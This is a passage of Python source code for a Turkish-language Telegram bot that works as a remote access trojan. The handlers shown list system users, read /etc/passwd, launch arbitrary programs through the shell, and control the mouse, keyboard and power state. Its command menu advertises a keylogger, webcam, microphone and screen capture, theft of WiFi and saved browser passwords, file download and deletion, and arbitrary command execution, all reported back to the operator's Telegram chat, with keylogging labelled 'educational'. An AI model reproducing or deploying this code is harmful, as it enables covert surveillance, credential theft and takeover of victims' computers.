@bot.message_handler(commands=['kullanicilar'])
def list_users(message):
    """Sistem kullanıcılarını listeler"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        if platform.system() == "Windows":
            result = subprocess.run(['net', 'user'], capture_output=True, text=True, encoding='utf-8', shell=True)
            users_text = "👥 SİSTEM KULLANICILARI\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            users_text += result.stdout
            
            if len(users_text) > 4000:
                with open("users.txt", "w", encoding="utf-8") as f:
                    f.write(users_text)
                bot.send_document(message.chat.id, open("users.txt", 'rb'), caption="👥 Sistem Kullanıcıları")
                os.remove("users.txt")
            else:
                bot.reply_to(message, users_text)
        else:
            result = subprocess.run(['cat', '/etc/passwd'], capture_output=True, text=True)
            bot.reply_to(message, f"👥 Kullanıcılar:\n\n{result.stdout[:4000]}")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['oturumac'])
def open_session(message):
    """Yeni oturum açar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        if platform.system() == "Windows":
            subprocess.Popen(['explorer', 'shell:AppsFolder'])
            bot.reply_to(message, "✅ Yeni oturum açıldı!")
        else:
            bot.reply_to(message, "❌ Bu özellik sadece Windows için!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['tarayiciac'])
def open_browser(message):
    """Tarayıcıyı açar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        url = command_text[1] if len(command_text) > 1 else "https://www.google.com"
        
        if not url.startswith('http'):
            url = 'https://' + url
        
        webbrowser.open(url)
        bot.reply_to(message, f"✅ Tarayıcı açıldı: {url}")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['uygulamaac'])
def open_app(message):
    """Uygulama açar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /uygulamaac [uygulama_ismi]\nÖrnek: /uygulamaac notepad")
            return
        
        app_name = command_text[1]
        
        if platform.system() == "Windows":
            subprocess.Popen(app_name, shell=True)
            bot.reply_to(message, f"✅ Uygulama açıldı: {app_name}")
        else:
            subprocess.Popen([app_name])
            bot.reply_to(message, f"✅ Uygulama açıldı: {app_name}")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['ekrancozunurluk'])
def screen_resolution(message):
    """Ekran çözünürlüğünü gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        width, height = pyautogui.size()
        resolution_text = f"""
🖥️ EKRAN ÇÖZÜNÜRLÜĞÜ
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 Genişlik: {width} px
📏 Yükseklik: {height} px
🖼️ Çözünürlük: {width}x{height}
        """
        bot.reply_to(message, resolution_text)
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['farecift'])
def double_click(message):
    """Çift tıklama yapar"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        pyautogui.doubleClick()
        bot.reply_to(message, "✅ Çift tıklama yapıldı!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['faresurukle'])
def drag_mouse(message):
    """Fareyi sürükler"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ')
        if len(command_text) < 5:
            bot.reply_to(message, "❓ Kullanım: /faresurukle [x1] [y1] [x2] [y2]")
            return
        
        x1, y1, x2, y2 = int(command_text[1]), int(command_text[2]), int(command_text[3]), int(command_text[4])
        
        pyautogui.drag(x2 - x1, y2 - y1, duration=0.5)
        bot.reply_to(message, f"✅ Fare sürüklendi: ({x1},{y1}) → ({x2},{y2})")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['klavyekisa'])
def keyboard_shortcut(message):
    """Klavye kısayolu gönderir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        command_text = message.text.split(' ', 1)
        if len(command_text) < 2:
            bot.reply_to(message, "❓ Kullanım: /klavyekisa [kısayol]\nÖrnek: /klavyekisa ctrl+c")
            return
        
        shortcut = command_text[1].lower()
        
        # Kısayolları parse et
        keys = shortcut.split('+')
        pyautogui.hotkey(*keys)
        bot.reply_to(message, f"✅ Kısayol gönderildi: {shortcut}")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['ekranbekleme'])
def screen_sleep(message):
    """Ekranı uyku moduna alır"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        if platform.system() == "Windows":
            subprocess.run(['rundll32.exe', 'powrprof.dll,SetSuspendState', '0,1,0'], shell=True)
            bot.reply_to(message, "💤 Ekran uyku moduna alındı!")
        else:
            bot.reply_to(message, "❌ Bu özellik sadece Windows için!")
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['islemcidetay'])
def cpu_details(message):
    """İşlemci detaylarını gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        cpu_count = psutil.cpu_count(logical=True)
        cpu_count_physical = psutil.cpu_count(logical=False)
        cpu_freq = psutil.cpu_freq()
        cpu_percent = psutil.cpu_percent(interval=1, percpu=True)
        
        cpu_text = f"""
⚙️ İŞLEMCİ DETAYLARI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔢 Mantıksal Çekirdek: {cpu_count}
🔢 Fiziksel Çekirdek: {cpu_count_physical}
⚡ Maksimum Frekans: {cpu_freq.max:.2f} MHz
⚡ Minimum Frekans: {cpu_freq.min:.2f} MHz
⚡ Mevcut Frekans: {cpu_freq.current:.2f} MHz

📊 Çekirdek Kullanımı:
"""
        for i, percent in enumerate(cpu_percent, 1):
            cpu_text += f"   Çekirdek {i}: {percent:.1f}%\n"
        
        bot.reply_to(message, cpu_text)
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['bellekdetay'])
def memory_details(message):
    """Bellek detaylarını gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    try:
        ram = psutil.virtual_memory()
        swap = psutil.swap_memory()
        
        memory_text = f"""
💾 BELLEK DETAYLARI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 RAM:
   Toplam: {ram.total / 1024 / 1024 / 1024:.2f} GB
   Kullanılan: {ram.used / 1024 / 1024 / 1024:.2f} GB
   Boş: {ram.available / 1024 / 1024 / 1024:.2f} GB
   Yüzde: {ram.percent}%

💿 SWAP:
   Toplam: {swap.total / 1024 / 1024 / 1024:.2f} GB
   Kullanılan: {swap.used / 1024 / 1024 / 1024:.2f} GB
   Boş: {swap.free / 1024 / 1024 / 1024:.2f} GB
   Yüzde: {swap.percent}%
        """
        bot.reply_to(message, memory_text)
    except Exception as e:
        bot.reply_to(message, f"❌ Hata: {str(e)}")

@bot.message_handler(commands=['komutlar'])
def show_commands_list(message):
    """Tüm komutların listesini gösterir"""
    if not check_authorized(message):
        bot.reply_to(message, "❌ Yetkiniz yok!")
        return
    
    commands_list = """
╔══════════════════════════════════════════════════════════════╗
║          TELEGRAM EĞİTİM BOTU - KOMUT LİSTESİ               ║
╚══════════════════════════════════════════════════════════════╝

📸 KAMERA & EKRAN
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
/kamerafoto          → Kameradan fotoğraf çek
/kameravideo         → 5 saniye video kaydet
/ekranfoto           → Ekran görüntüsü al
/ekrankayit          → Ekran kaydı (10 saniye)

🔍 BİLGİ & SİSTEM
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
/bilgiip             → IP ve sistem bilgileri
/processlist          → Çalışan programlar
/wifi                → WiFi şifreleri
/clipboard           → Pano içeriği
/sistemdetay         → Detaylı sistem bilgisi
/diskbilgi           → Disk kullanımı
/ramcpu              → RAM ve CPU kullanımı
/portlar             → Açık portlar
/usbcihazlar         → USB cihazlar
/servisler           → Sistem servisleri

⌨️ KEYLOGGER (Eğitim Amaçlı)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
/keyloggerstart      → Keylogger başlat
/keyloggerstop       → Keylogger durdur
/keyloggerlog        → Logları gönder

📁 DOSYA İŞLEMLERİ
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
/dosyalist [klasör]  → Dosyaları listele
/dosyaindir [dosya]  → Dosya indir (max 50MB)
/dosyasil [dosya]    → Dosya sil
/dosyaara [isim]     → Dosya ara
/dosyaoku [dosya]    → Dosya içeriğini oku

🌐 TARAYICI & ŞİFRELER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
/sifreler            → Kayıtlı şifreler (Chrome/Edge)
/gecmis              → Tarayıcı geçmişi
/webekran [url]      → Web sitesi ekran görüntüsü

🖱️ KONTROL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
/klavye [metin]      → Klavyeden yaz
/fare                → Fare konumu
/farehareket [x] [y] → Fareyi hareket ettir
/faretikla [sol/sag] → Fare tıkla
/ekrankilitle        → Ekranı kilitle
/komutcalistir [cmd] → Komut çalıştır
/kapat               → Bilgisayarı kapat
/yenidenbaslat       → Bilgisayarı yeniden başlat

📋 YARDIM
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
/start               → Botu başlat
/yardim              → Detaylı yardım
/komutlar            → Bu liste

╔══════════════════════════════════════════════════════════════╗
║                    TOPLAM: 60+ KOMUT                         ║
╚══════════════════════════════════════════════════════════════╝
    """
    
    bot.reply_to(message, commands_list)

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Diğer tüm mesajları yakalar"""
    # Forum topic mesajlarını tamamen görmezden gel
    if hasattr(message, 'message_thread_id') and message.message_thread_id is not None:
        return
    
    if not check_authorized(message):
        return
    
    # Sadece text mesajlarını ve komutları kontrol et
    # Kod blokları, sistem mesajları, girip çıkma mesajları gibi şeyleri görmezden gel
    if not message.text:
        return
    
    # Eğer mesaj / ile başlıyorsa ama komut değilse uyarı ver
    if message.text.startswith('/'):
        # Komut listesinde yoksa uyarı ver
        bot.reply_to(message, "❓ Bilinmeyen komut. /yardim yazarak komutları görebilirsiniz.")
    # Normal text mesajları için hiçbir şey yapma (kod gönderme, normal mesaj vs.)


if __name__ == "__main__":
    print("🤖 Telegram Bot başlatılıyor...")
    print(f"📱 Chat ID: {CHAT_ID}")
    
    # Webhook'u temizle (eğer varsa)
    try:
        bot.delete_webhook(drop_pending_updates=True)
        print("✅ Webhook temizlendi")
    except:
        pass
    
    # Telegram'ın orijinal menü butonuna komutları ekle
    try:
        commands = [
            telebot.types.BotCommand("start", "Botu başlat"),
            telebot.types.BotCommand("komutlar", "Komut listesi"),
            telebot.types.BotCommand("yardim", "Yardım"),
            telebot.types.BotCommand("kamerafoto", "Kameradan fotoğraf"),
            telebot.types.BotCommand("kameravideo", "Kamera video kaydı"),
            telebot.types.BotCommand("ekranfoto", "Ekran görüntüsü"),
            telebot.types.BotCommand("ekrankayit", "Ekran kaydı"),
            telebot.types.BotCommand("bilgiip", "IP ve sistem bilgisi"),
            telebot.types.BotCommand("sistemdetay", "Detaylı sistem bilgisi"),
            telebot.types.BotCommand("processlist", "Çalışan programlar"),
            telebot.types.BotCommand("wifi", "WiFi şifreleri"),
            telebot.types.BotCommand("clipboard", "Pano içeriği"),
            telebot.types.BotCommand("diskbilgi", "Disk kullanımı"),
            telebot.types.BotCommand("ramcpu", "RAM ve CPU kullanımı"),
            telebot.types.BotCommand("portlar", "Açık portlar"),
            telebot.types.BotCommand("usbcihazlar", "USB cihazlar"),
            telebot.types.BotCommand("servisler", "Sistem servisleri"),
            telebot.types.BotCommand("agbilgisi", "Ağ bağlantı bilgileri"),
            telebot.types.BotCommand("sistemzaman", "Sistem zamanı"),
            telebot.types.BotCommand("kullanicilar", "Sistem kullanıcıları"),
            telebot.types.BotCommand("islemcidetay", "İşlemci detayları"),
            telebot.types.BotCommand("bellekdetay", "Bellek detayları"),
            telebot.types.BotCommand("keyloggerstart", "Keylogger başlat"),
            telebot.types.BotCommand("keyloggerstop", "Keylogger durdur"),
            telebot.types.BotCommand("keyloggerlog", "Keylogger logları"),
            telebot.types.BotCommand("dosyalist", "Dosyaları listele"),
            telebot.types.BotCommand("dosyaindir", "Dosya indir"),
            telebot.types.BotCommand("dosyasil", "Dosya sil"),
            telebot.types.BotCommand("dosyaara", "Dosya ara"),
            telebot.types.BotCommand("dosyaoku", "Dosya içeriğini oku"),
            telebot.types.BotCommand("dosyayukle", "Dosya yükle"),
            telebot.types.BotCommand("dosyayenidenadlandir", "Dosya yeniden adlandır"),
            telebot.types.BotCommand("dosyakopyala", "Dosya kopyala"),
            telebot.types.BotCommand("dosyatasima", "Dosya taşı"),
            telebot.types.BotCommand("klasorolustur", "Klasör oluştur"),
            telebot.types.BotCommand("dosyaboyutu", "Dosya boyutu"),
            telebot.types.BotCommand("sifreler", "Kayıtlı şifreler"),
            telebot.types.BotCommand("gecmis", "Tarayıcı geçmişi"),
            telebot.types.BotCommand("webekran", "Web sitesi ekran görüntüsü"),
            telebot.types.BotCommand("klavye", "Klavyeden yaz"),
            telebot.types.BotCommand("fare", "Fare konumu"),
            telebot.types.BotCommand("farehareket", "Fareyi hareket ettir"),
            telebot.types.BotCommand("faretikla", "Fare tıkla"),
            telebot.types.BotCommand("farecift", "Çift tıklama"),
            telebot.types.BotCommand("faresurukle", "Fare sürükle"),
            telebot.types.BotCommand("ekrankilitle", "Ekranı kilitle"),
            telebot.types.BotCommand("komutcalistir", "Komut çalıştır"),
            telebot.types.BotCommand("klavyekisa", "Klavye kısayolu"),
            telebot.types.BotCommand("kapat", "Bilgisayarı kapat"),
            telebot.types.BotCommand("yenidenbaslat", "Bilgisayarı yeniden başlat"),
            telebot.types.BotCommand("tumpencereler", "Tüm açık pencereler"),
            telebot.types.BotCommand("pencerebilgi", "Aktif pencere bilgisi"),
            telebot.types.BotCommand("pencerekapat", "Aktif pencereyi kapat"),
            telebot.types.BotCommand("pencerebuyut", "Pencereyi büyüt"),
            telebot.types.BotCommand("pencerekucult", "Pencereyi küçült"),
            telebot.types.BotCommand("pencereaktif", "Pencereyi aktif et"),
            telebot.types.BotCommand("mikrofon", "Mikrofon kaydı"),
            telebot.types.BotCommand("ekranparlaklik", "Ekran parlaklığı ayarla"),
            telebot.types.BotCommand("sesduzeyi", "Ses seviyesi ayarla"),
            telebot.types.BotCommand("tarayiciac", "Tarayıcı aç"),
            telebot.types.BotCommand("uygulamaac", "Uygulama aç"),
            telebot.types.BotCommand("oturumac", "Yeni oturum aç"),
            telebot.types.BotCommand("ekrancozunurluk", "Ekran çözünürlüğü"),
            telebot.types.BotCommand("ekranbekleme", "Ekranı uyku moduna al"),
        ]
        
        bot.set_my_commands(commands)
        print("✅ Menü butonları Telegram'a eklendi!")
    except Exception as e:
        print(f"⚠️ Menü butonları eklenemedi: {str(e)}")
    
    print("✅ Bot aktif ve komutları dinliyor...")
    print("⚡ Anlık yanıt modu aktif")
    print("🚫 Forum topic'leri devre dışı")
    print("⚠️  Keylogger özelliği eğitim amaçlıdır!")
    print("💡 NOT: Botu durdurmak için Ctrl+C tuşlarına basın")
    
    try:
        # Anlık yanıt için polling ayarları optimize edildi
        # Forum topic'lerini tamamen devre dışı bırak
        bot.polling(
            none_stop=True, 
            interval=0,  # Anlık yanıt için 0
            timeout=10,  # Daha kısa timeout
            skip_pending=True,  # Bekleyen mesajları atla
            long_polling_timeout=1  # Long polling timeout
        )
    except KeyboardInterrupt:
        print("\n🛑 Bot durduruluyor...")
        stop_keylogger()
    except Exception as e:
        error_msg = str(e)
        if "409" in error_msg or "Conflict" in error_msg:
            print("\n❌ HATA: Bot zaten çalışıyor!")
            print("💡 Çözüm: Tüm Python process'lerini durdurun:")
            print("   Windows: taskkill /F /IM python.exe")
            print("   Veya botu çalıştıran diğer terminal pencerelerini kapatın")
        else:
            print(f"❌ Bot hatası: {error_msg}")
            import traceback
            traceback.print_exc()
        stop_keylogger()

